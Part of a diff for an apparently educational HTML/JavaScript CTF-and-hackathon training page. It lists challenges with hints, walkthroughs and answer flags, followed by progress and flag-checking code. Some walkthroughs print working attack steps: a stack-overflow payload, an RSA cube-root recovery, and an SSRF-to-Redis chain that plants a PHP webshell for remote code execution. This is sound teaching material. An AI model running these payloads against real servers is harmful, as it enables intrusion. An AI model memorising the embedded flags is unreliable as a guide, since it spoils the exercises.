+    diff:'Elite', xp:220,
+    narrative:`Hackathon: build a minimal web dashboard that fetches the latest 5 CVEs from NVD API v2.0 and displays them as cards (ID, CVSS score, summary). Judge checks that the page renders real CVE data.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 cveboard.py  # starts on :8080'},
+      {t:'out', txt:'[*] Fetching NVD API...'},
+      {t:'out', txt:'[+] CVE-2026-12345  CVSS:9.8  Remote Code Execution in...'},
+      {t:'out', txt:'[+] CVE-2026-11234  CVSS:8.1  Auth bypass in...'},
+      {t:'flag', txt:'FLAG{CVE_DASHBOARD_LIVE}'},
+    ],
+    flag:'FLAG{CVE_DASHBOARD_LIVE}',
+    hint:'NVD API: `GET https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=5`. Parse `.vulnerabilities[].cve`. CVSS score is under `.metrics.cvssMetricV31[0].cvssData.baseScore`.',
+    walkthrough:[
+      {step:'Fetch with requests: <code>r = requests.get("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=5")</code>.'},
+      {step:'Parse: <code>cves = r.json()["vulnerabilities"]</code>. Each item has <code>.cve.id</code>, <code>.cve.descriptions[0].value</code>.'},
+      {step:'CVSS: <code>.cve.metrics.cvssMetricV31[0].cvssData.baseScore</code> (fall back to V30 or V2 if missing).'},
+      {step:'Render as HTML cards using Flask or serve a static page. Submit the flag when the page loads real data.'},
+    ],
+    tags:['api','web','dashboard','hackathon'],
+  },
+  // ── CTF 7
+  {
+    id:13, type:'CTF', title:'BUFFER BREACH — Classic Stack Overflow',
+    diff:'Classified', xp:250,
+    narrative:`A vulnerable C binary running on the server has no stack canaries. Overflow the buffer, overwrite the return address to jump to the win() function, and read the flag from stdout.`,
+    scenario:[
+      {t:'s-line', txt:'# Vuln binary: bufbreach (no PIE, no canary)'},
+      {t:'cmd', txt:'$ python3 -c "import sys; sys.stdout.buffer.write(b\'A\'*72 + b\'\\xef\\xbe\\xad\\xde\')" | ./bufbreach'},
+      {t:'out', txt:'Overflow detected. Jumping to win()...'},
+      {t:'flag', txt:'FLAG{ST4CK_0V3RFL0W_PWN3D}'},
+    ],
+    flag:'FLAG{ST4CK_0V3RFL0W_PWN3D}',
+    hint:'Use `checksec bufbreach` to verify no canary/PIE. Find buffer size with GDB: `info frame`. Find win() address: `nm bufbreach | grep win`. Craft payload: padding + address (little-endian).',
+    walkthrough:[
+      {step:'Verify: <code>checksec --file=bufbreach</code> — confirm No Canary, No PIE.'},
+      {step:'Open in GDB: <code>gdb ./bufbreach</code>. Set breakpoint at main, run, inspect <code>info frame</code> to find saved RIP offset (typically 72 bytes for a 64-byte buffer + 8 byte rbp).'},
+      {step:'Find win address: <code>nm bufbreach | grep win</code> → e.g., <code>0x4006ef</code>.'},
+      {step:'Craft: <code>python3 -c "from pwn import *; p = process(\'./bufbreach\'); p.sendline(b\'A\'*72 + p64(0x4006ef)); print(p.recvall())"</code>.'},
+    ],
+    tags:['pwn','buffer overflow','binary exploitation'],
+  },
+  // ── HACKATHON 7
+  {
+    id:14, type:'HACK', title:'ZERO WIRE — Packet Sniffer in Python',
+    diff:'Classified', xp:240,
+    narrative:`Build a raw packet sniffer using Scapy that captures HTTP traffic on localhost, extracts GET/POST request lines, and logs them to a file. Judge replays 5 HTTP requests and checks your log.`,
+    scenario:[
+      {t:'cmd', txt:'$ sudo python3 sniffer.py -i lo -o capture.log &'},
+      {t:'out', txt:'[*] Sniffing on lo...'},
+      {t:'out', txt:'[HTTP] GET /index.html HTTP/1.1 | Host: localhost'},
+      {t:'out', txt:'[HTTP] POST /login HTTP/1.1 | Host: localhost'},
+      {t:'flag', txt:'FLAG{PACKET_SNIFFER_BUILT}'},
+    ],
+    flag:'FLAG{PACKET_SNIFFER_BUILT}',
+    hint:'Scapy: `sniff(iface=iface, filter="tcp port 80", prn=handler)`. In handler: if `Raw` layer present, decode payload and look for b"GET" or b"POST".',
+    walkthrough:[
+      {step:'Install: <code>pip install scapy</code>.'},
+      {step:'Define handler: check if packet has <code>Raw</code> layer. Decode <code>packet[Raw].load</code> as utf-8 (ignore errors).'},
+      {step:'Split on <code>\\r\\n</code> and check if first line starts with GET/POST/PUT/DELETE.'},
+      {step:'Log to file with timestamp. Run: <code>sudo python3 sniffer.py -i lo -o capture.log</code>.'},
+    ],
+    tags:['networking','scapy','packets','hackathon'],
+  },
+  // ── CTF 8
+  {
+    id:15, type:'CTF', title:'REVERSE SHELL — Binary Reversing',
+    diff:'Classified', xp:255,
+    narrative:`A stripped ELF binary checks a password before printing the flag. Use Ghidra or strings to reverse the password check and supply the correct input.`,
+    scenario:[
+      {t:'cmd', txt:'$ strings reverseme | grep -i pass'},
+      {t:'out', txt:'Enter password: '},
+      {t:'out', txt:'p4ssw0rd_n0t_h3r3'},
+      {t:'cmd', txt:'$ ./reverseme'},
+      {t:'out', txt:'Enter password: p4ssw0rd_n0t_h3r3'},
+      {t:'flag', txt:'FLAG{R3V3RS3_3NG1N33R3D}'},
+    ],
+    flag:'FLAG{R3V3RS3_3NG1N33R3D}',
+    hint:'`strings reverseme | grep -v " "` often leaks the hardcoded password. Use `ltrace ./reverseme` to trace strcmp calls. Ghidra decompiler shows the comparison directly.',
+    walkthrough:[
+      {step:'Run <code>strings reverseme</code> — look for anything that looks like a passphrase or key.'},
+      {step:'Use <code>ltrace ./reverseme</code> — ltrace shows library calls. Watch for <code>strcmp("yourinput","p4ssw0rd_n0t_h3r3")</code>.'},
+      {step:'Open in Ghidra: File → Import → analyze. Find main(), decompile the password check.'},
+      {step:'Supply the password and read the flag output.'},
+    ],
+    tags:['reverse engineering','ghidra','strings'],
+  },
+  // ── HACKATHON 8
+  {
+    id:16, type:'HACK', title:'LOCKDOWN — Build a File Integrity Monitor',
+    diff:'Classified', xp:245,
+    narrative:`Hackathon: build a Python daemon that monitors a target directory, hashes all files on start (SHA-256), then watches for changes every 10 seconds. On change: log the filename, old hash, new hash.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 fim.py --watch /var/www/html &'},
+      {t:'out', txt:'[*] Baseline hashes stored for 42 files'},
+      {t:'out', txt:'[!] CHANGE: index.html | OLD:a3f2... | NEW:9b1c...'},
+      {t:'flag', txt:'FLAG{FILE_INTEGRITY_MONITOR}'},
+    ],
+    flag:'FLAG{FILE_INTEGRITY_MONITOR}',
+    hint:'Use `hashlib.sha256(open(f,"rb").read()).hexdigest()` to hash files. Store in a dict `{path: hash}`. In a loop, rehash and compare. Use `os.walk()` to enumerate.',
+    walkthrough:[
+      {step:'Enumerate: <code>for root,dirs,files in os.walk(directory)</code> — build full paths.'},
+      {step:'Baseline: hash each file, store in <code>baseline = {path: sha256}</code>.'},
+      {step:'Loop with <code>time.sleep(10)</code>. Re-hash, compare with baseline. If different, log the change and update baseline.'},
+      {step:'Handle new files (not in baseline) and deleted files (in baseline but not on disk).'},
+    ],
+    tags:['python','blue team','monitoring','hackathon'],
+  },
+  // ── CTF 9
+  {
+    id:17, type:'CTF', title:'CRYPTVAULT — RSA Small Exponent Attack',
+    diff:'Classified', xp:270,
+    narrative:`The server encrypted the flag with RSA e=3 and a small message. Because m^3 < n, you can recover plaintext with a simple cube root — no modular inverse needed.`,
+    scenario:[
+      {t:'s-line', txt:'# Given: n (2048-bit), e=3, c=m^3 (no wrap)'},
+      {t:'cmd', txt:'$ python3 -c "from gmpy2 import iroot; m,ex=iroot(c,3); print(bytes.fromhex(hex(m)[2:]).decode())"'},
+      {t:'flag', txt:'FLAG{RSA_SM4LL_E_ATTACK}'},
+    ],
+    flag:'FLAG{RSA_SM4LL_E_ATTACK}',
+    hint:'If m^e < n, the ciphertext is just m^e in the integers. Take the e-th integer root of c using gmpy2.iroot(c, e). If ex (exact) is True, m is recovered.',
+    walkthrough:[
+      {step:'Verify: is e=3 and c < n? If yes, m^3 didn\'t wrap around the modulus.'},
+      {step:'Install gmpy2: <code>pip install gmpy2</code>.'},
+      {step:'Run: <code>m, exact = gmpy2.iroot(c, 3)</code>. If exact is True, you have the plaintext.'},
+      {step:'Convert to bytes: <code>bytes.fromhex(hex(int(m))[2:]).decode()</code> to read the flag.'},
+    ],
+    tags:['cryptography','rsa','math','ctf'],
+  },
+  // ── HACKATHON 9
+  {
+    id:18, type:'HACK', title:'ADVERSARY SIM — Automated MITRE ATT&CK Report',
+    diff:'Classified', xp:260,
+    narrative:`Build a Python script that queries the MITRE ATT&CK STIX data, looks up a technique by ID (e.g., T1059), and outputs: name, tactic, description, detection, mitigation — as a formatted markdown report.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 attack_report.py T1059'},
+      {t:'out', txt:'# T1059 — Command and Scripting Interpreter'},
+      {t:'out', txt:'Tactic: Execution'},
+      {t:'out', txt:'Detection: Monitor process creation events...'},
+      {t:'out', txt:'Mitigation: Restrict interpreter usage via AppLocker...'},
+      {t:'flag', txt:'FLAG{MITRE_REPORT_BUILT}'},
+    ],
+    flag:'FLAG{MITRE_REPORT_BUILT}',
+    hint:'Use the `mitreattack-python` library: `pip install mitreattack-python`. Load with `MitreAttackData("enterprise-attack.json")`. Call `.get_object_by_attack_id(tid, "technique")` to fetch the technique object.',
+    walkthrough:[
+      {step:'Install: <code>pip install mitreattack-python requests</code>.'},
+      {step:'Download STIX data: <code>MitreAttackData("enterprise-attack.json")</code> (auto-downloads on first run).'},
+      {step:'Fetch technique: <code>technique = attack_data.get_object_by_attack_id(tid, "technique")</code>.'},
+      {step:'Extract fields: <code>technique.name</code>, <code>technique.description</code>. Fetch mitigations via <code>attack_data.get_mitigations_mitigating_technique(technique.id)</code>. Print as markdown.'},
+    ],
+    tags:['mitre','threat intel','python','hackathon'],
+  },
+  // ── CTF 10 / BOSS
+  {
+    id:19, type:'CTF', title:'FINAL NODE — Full Chain Exploitation',
+    diff:'Classified', xp:300,
+    narrative:`The final CTF node. A web app has an SSRF vulnerability that lets you reach an internal Redis instance. Use SSRF → Redis to write a PHP webshell, then RCE the server and read /flag.txt.`,
+    scenario:[
+      {t:'cmd', txt:'$ curl "http://target/fetch?url=dict://127.0.0.1:6379/CONFIG+SET+dir+/var/www/html"'},
+      {t:'out', txt:'+OK'},
+      {t:'cmd', txt:'$ curl "http://target/fetch?url=dict://127.0.0.1:6379/SET+shell+%3C%3Fphp+system(%24_GET[c])%3B%3F%3E"'},
+      {t:'out', txt:'+OK'},
+      {t:'cmd', txt:'$ curl "http://target/fetch?url=dict://127.0.0.1:6379/CONFIG+SET+dbfilename+shell.php"'},
+      {t:'cmd', txt:'$ curl "http://target/shell.php?c=cat+/flag.txt"'},
+      {t:'flag', txt:'FLAG{SSRF_2_REDIS_2_RCE}'},
+    ],
+    flag:'FLAG{SSRF_2_REDIS_2_RCE}',
+    hint:'SSRF dict:// protocol speaks raw Redis commands. Chain: CONFIG SET dir (webroot) → SET key (PHP code) → CONFIG SET dbfilename (shell.php) → BGSAVE → access shell.',
+    walkthrough:[
+      {step:'Confirm SSRF: try <code>url=http://127.0.0.1/</code> — if it returns internal content, SSRF is confirmed.'},
+      {step:'Probe Redis via dict://: <code>url=dict://127.0.0.1:6379/PING</code> → should get <code>+PONG</code>.'},
+      {step:'Set webroot dir: <code>CONFIG SET dir /var/www/html</code>. Set PHP payload in a Redis key. Set dbfilename to shell.php. Run BGSAVE.'},
+      {step:'Request <code>/shell.php?c=cat+/flag.txt</code> to execute and read the flag.'},
+    ],
+    tags:['web','ssrf','redis','rce','advanced'],
+  },
+  // ── HACKATHON 10 / BOSS
+  {
+    id:20, type:'HACK', title:'EXFIL COMPLETE — Full CTF Platform in One Hour',
+    diff:'Classified', xp:350,
+    narrative:`Final hackathon boss. Build a mini CTF platform: a Flask web app with user registration, challenge listing (3 hardcoded challenges), flag submission, and a scoreboard. Judge deploys it locally and tests all features.`,
+    scenario:[
+      {t:'cmd', txt:'$ python3 ctfplatform.py'},
+      {t:'out', txt:'[*] CTF Platform running on :5000'},
+      {t:'out', txt:'Routes: / (scoreboard)  /register  /challenges  /submit'},
+      {t:'out', txt:'[+] User "operative1" registered'},
+      {t:'out', txt:'[+] Flag submitted for chall-1: correct! +100 XP'},
+      {t:'flag', txt:'FLAG{CTF_PLATFORM_DEPLOYED}'},
+    ],
+    flag:'FLAG{CTF_PLATFORM_DEPLOYED}',
+    hint:'Use Flask + a dict as in-memory user/score store. `users = {}`, `scores = {}`. POST /register stores username. POST /submit checks flag against hardcoded dict, updates score.',
+    walkthrough:[
+      {step:'Scaffold: <code>app = Flask(__name__)</code>. Define <code>users={}</code>, <code>scores={}</code>, <code>challenges={}</code>.'},
+      {step:'<code>POST /register</code>: get username from form, store in users dict, init score to 0.'},
+      {step:'<code>GET /challenges</code>: render list of 3 challenges with titles and point values.'},
+      {step:'<code>POST /submit</code>: check submitted flag against <code>challenges[id]["flag"]</code>, add points to score, redirect to scoreboard.'},
+      {step:'<code>GET /</code> (scoreboard): sort <code>scores.items()</code> by value descending, render as table. Deploy and submit the flag.'},
+    ],
+    tags:['python','flask','web app','hackathon','boss'],
+  },
+];
+
+// ─── STATE ────────────────────────────────────────────────────────────────
+const STATE = {
+  started: false,
+  current: 0,
+  xp: 0,
+  solved: new Set(),
+  hints: 0,
+};
+
+// ─── TRAIL START ─────────────────────────────────────────────────────────
+function startTrail() {
+  STATE.started = true;
+  document.getElementById('intro-panel').style.display = 'none';
+  document.getElementById('trail-map').style.display = 'flex';
+  document.getElementById('stats-bar').style.display = 'flex';
+  document.getElementById('challenge-panel').style.display = 'block';
+  document.getElementById('event-log').style.display = 'block';
+  document.getElementById('all-challenges-section').style.display = 'block';
+  buildTrailMap();
+  buildChallengeGrid();
+  loadChallenge(0);
+  logEvent('Trail started. Good luck, operative.', 'info');
+}
+
+// ─── TRAIL MAP ────────────────────────────────────────────────────────────
+function buildTrailMap() {
+  const map = document.getElementById('trail-map');
+  map.innerHTML = '';
+  CHALLENGES.forEach((ch, i) => {
+    if (i > 0) {
+      const conn = document.createElement('div');
+      conn.className = 'trail-connector' + (STATE.solved.has(i-1) ? ' done' : '');
+      conn.id = 'conn-' + (i-1);
+      map.appendChild(conn);
+    }
+    const node = document.createElement('div');
+    let cls = 'trail-node';
+    if (STATE.solved.has(i)) cls += ' done';
+    else if (i === STATE.current) cls += ' active';
+    else cls += ' locked';
+    node.className = cls;
+    node.id = 'node-' + i;
+    node.onclick = () => { if (STATE.solved.has(i) || i === STATE.current) loadChallenge(i); };
+    const icon = ch.type === 'CTF' ? '🔴' : ch.id === 19 || ch.id === 20 ? '🏆' : '🟣';
+    node.innerHTML = `<div class="node-icon">${icon}</div><div class="node-label">${ch.id}. ${ch.type}</div>`;
+    map.appendChild(node);
+  });
+}
+
+function refreshTrailMap() {
+  CHALLENGES.forEach((ch, i) => {
+    const node = document.getElementById('node-' + i);
+    if (!node) return;
+    let cls = 'trail-node';
+    if (STATE.solved.has(i)) cls += ' done';
+    else if (i === STATE.current) cls += ' active';
+    else cls += ' locked';
+    node.className = cls;
+    if (i > 0) {
+      const conn = document.getElementById('conn-' + (i-1));
+      if (conn) conn.className = 'trail-connector' + (STATE.solved.has(i-1) ? ' done' : '');
+    }
+  });
+}
+
+// ─── CHALLENGE GRID ───────────────────────────────────────────────────────
+function buildChallengeGrid() {
+  const grid = document.getElementById('chall-grid');
+  grid.innerHTML = '';
+  CHALLENGES.forEach((ch, i) => {
+    const card = document.createElement('div');
+    card.className = 'chall-card' + (STATE.solved.has(i) ? ' done-card' : '');
+    card.id = 'cc-' + i;
+    card.onclick = () => { if (STATE.solved.has(i) || i === STATE.current) loadChallenge(i); };
+    card.innerHTML = `
+      ${STATE.solved.has(i) ? '<div class="done-overlay">✅</div>' : ''}
+      <div class="cc-top"><span class="cc-name">${ch.title}</span><span class="cc-pts">+${ch.xp} XP</span></div>
+      <div class="cc-desc">${ch.narrative.substring(0,80)}…</div>
+      <div class="cc-tags">${ch.tags.map(t=>`<span class="cc-tag">${t}</span>`).join('')}</div>
+    `;
+    grid.appendChild(card);
+  });
+}
+
+function refreshChallengeGrid() {
+  CHALLENGES.forEach((ch, i) => {
+    const card = document.getElementById('cc-' + i);
+    if (!card) return;
+    card.className = 'chall-card' + (STATE.solved.has(i) ? ' done-card' : '');
+    const overlay = card.querySelector('.done-overlay');
+    if (STATE.solved.has(i) && !overlay) {
+      const d = document.createElement('div');
+      d.className = 'done-overlay'; d.textContent = '✅';
+      card.prepend(d);
+    }
+  });
+}
+
+// ─── LOAD CHALLENGE ───────────────────────────────────────────────────────
+function loadChallenge(idx) {
+  STATE.current = idx;
+  const ch = CHALLENGES[idx];
+  document.getElementById('chall-num').textContent = `CHALLENGE ${idx+1} / 20`;
+  document.getElementById('chall-title').textContent = ch.title;
+
+  const typeBadge = ch.type === 'CTF' ? '<span class="badge badge-ctf">CTF</span>' : '<span class="badge badge-hack">HACKATHON</span>';
+  const diffMap = {Rookie:'rookie',Operative:'operative',Elite:'elite',Classified:'classified'};
+  const diffBadge = `<span class="badge badge-${diffMap[ch.diff]}">${ch.diff.toUpperCase()}</span>`;
+  const xpBadge = `<span class="badge badge-operative">+${ch.xp} XP</span>`;
+  document.getElementById('chall-meta').innerHTML = typeBadge + diffBadge + xpBadge;
+
+  document.getElementById('chall-narrative').textContent = ch.narrative;
+
+  // scenario
+  const sc = document.getElementById('chall-scenario');
+  sc.innerHTML = ch.scenario.map(l => {
+    if (l.t === 'cmd') return `<div class="s-cmd">${escHtml(l.txt)}</div>`;
+    if (l.t === 'flag') return `<div class="s-flag">${escHtml(l.txt)}</div>`;
+    if (l.t === 'out') return `<div class="s-out">${escHtml(l.txt)}</div>`;
+    return `<div class="s-line">${escHtml(l.txt)}</div>`;
+  }).join('');
+
+  // reset ui
+  document.getElementById('flag-input').value = '';
+  document.getElementById('flag-result').style.display = 'none';
+  document.getElementById('flag-result').textContent = '';
+  document.getElementById('walkthrough').style.display = 'none';
+  document.getElementById('walkthrough').innerHTML = '';
+  document.getElementById('next-btn').style.display = STATE.solved.has(idx) ? 'inline-flex' : 'none';
+
+  updateStats();
+  refreshTrailMap();
+  document.getElementById('challenge-panel').scrollIntoView({behavior:'smooth', block:'start'});
+}
+
+// ─── FLAG CHECK ───────────────────────────────────────────────────────────
+function checkFlag() {
+  const ch = CHALLENGES[STATE.current];
+  const input = document.getElementById('flag-input').value.trim();
+  const res = document.getElementById('flag-result');
+  res.style.display = 'inline-block';
+  if (input.toUpperCase() === ch.flag.toUpperCase()) {
+    res.className = 'flag-result correct';
+    res.textContent = '✅ CORRECT! Flag captured.';
+    if (!STATE.solved.has(STATE.current)) {
+      STATE.solved.add(STATE.current);
+      STATE.xp += ch.xp;
+      logEvent(`Flag captured: ${ch.title} (+${ch.xp} XP)`, 'good');
+    }
+    document.getElementById('next-btn').style.display = 'inline-flex';
+    updateStats();
+    refreshTrailMap();
+    refreshChallengeGrid();
+    if (STATE.solved.size === CHALLENGES.length) {
+      logEvent('🏆 ALL 20 CHALLENGES COMPLETE — EXFIL SUCCESSFUL', 'good');
+      document.getElementById('s-status').textContent = 'EXFIL_SUCCESS';
+      document.getElementById('s-status').style.color = 'var(--green)';
+    }
+  } else {
+    res.className = 'flag-result wrong';
+    res.textContent = '❌ Wrong flag. Try again.';
+    logEvent(`Wrong flag on: ${ch.title}`, 'bad');
+  }
+}
+
+function showHint() {
+  const ch = CHALLENGES[STATE.current];
+  STATE.hints++;
+  updateStats();
+  logEvent(`Hint used on: ${ch.title}`, 'warn');
+  alert('💡 HINT: ' + ch.hint);
+}
+
+function showWalkthrough() {
+  const ch = CHALLENGES[STATE.current];
+  const wt = document.getElementById('walkthrough');
+  if (wt.style.display === 'block') { wt.style.display = 'none'; return; }
+  wt.innerHTML = `<h3>📖 Walkthrough — ${ch.title}</h3>` +
+    ch.walkthrough.map((s,i) => `<div class="wt-step"><div class="wt-num">${i+1}</div><div class="wt-text">${s.step}</div></div>`).join('');
+  wt.style.display = 'block';
+  logEvent(`Walkthrough opened for: ${ch.title}`, 'info');
+}
+
+function nextChallenge() {
+  const next = STATE.current + 1;
+  if (next < CHALLENGES.length) loadChallenge(next);
+  else logEvent('You have reached the end of the trail!', 'info');
+}
+
+// ─── STATS ────────────────────────────────────────────────────────────────
+function updateStats() {
+  document.getElementById('s-xp').textContent = STATE.xp;
+  document.getElementById('s-flags').textContent = `${STATE.solved.size}/20`;
+  document.getElementById('s-hints').textContent = STATE.hints;
+  document.getElementById('s-node').textContent = `${STATE.current+1}/20`;
+}
+
+// ─── LOG ─────────────────────────────────────────────────────────────────
+function logEvent(msg, cls) {
+  const body = document.getElementById('log-body');
+  const ts = new Date().toLocaleTimeString();
+  const line = document.createElement('div');
+  line.className = 'log-line ' + (cls||'');
+  line.textContent = `[${ts}] ${msg}`;
+  body.appendChild(line);
+  body.scrollTop = body.scrollHeight;
+}
+
+// ─── UTIL ─────────────────────────────────────────────────────────────────
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// Enter key submits flag
+document.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && document.activeElement === document.getElementById('flag-input')) {
+    checkFlag();
+  }
+});
+</script>
+</body>
+</html>
